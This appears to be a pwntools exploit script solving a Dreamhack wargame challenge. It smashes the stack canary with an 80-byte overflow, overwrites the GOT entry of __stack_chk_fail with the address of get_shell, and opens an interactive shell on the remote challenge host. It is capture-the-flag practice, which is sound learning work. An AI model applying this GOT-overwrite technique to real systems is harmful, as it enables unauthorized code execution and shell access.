from pwn import *

connection = remote('host1.dreamhack.games' , 9370) 
E = ELF("32\ssp_000") 

buf = b'A'*80 # Canary에 조작이 감지될 정도면 된다.

chkfail_addr = E.got['__stack_chk_fail']
getshell_addr = E.symbols['get_shell']


print(hex(chkfail_addr))
print(hex(getshell_addr))

connection.sendline(buf) # Canary 더럽히기
connection.sendlineafter("Addr :", str(chkfail_addr))
connection.sendlineafter("Value :", str(getshell_addr))


connection.interactive()
